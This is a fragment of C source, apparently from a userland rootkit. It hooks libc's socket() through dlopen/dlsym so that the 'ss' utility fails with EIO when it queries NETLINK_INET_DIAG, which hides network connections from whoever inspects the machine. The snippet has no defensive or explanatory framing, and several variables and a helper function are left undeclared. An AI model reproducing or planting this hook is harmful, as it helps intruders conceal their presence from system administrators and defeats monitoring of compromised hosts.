#include <sys/socket.h>
#include <linux/netlink.h>
#include <linux/rtnetlink.h>
int socket(int domain, int type, int protocol) { 
    if (!libc)libc = dlopen (LIBC_PATH, RTLD_LAZY);
    if (!old_socket)old_socket = dlsym(libc,"socket");
    if(domain == AF_NETLINK && type == SOCK_RAW && protocol == NETLINK_INET_DIAG) {
      me = get_my_procname();
      if(!strcmp(me,"ss") || !strcmp(me,"/usr/sbin/ss")) { errno = EIO; return -1; }
    }
    return old_socket(domain,type,protocol);
}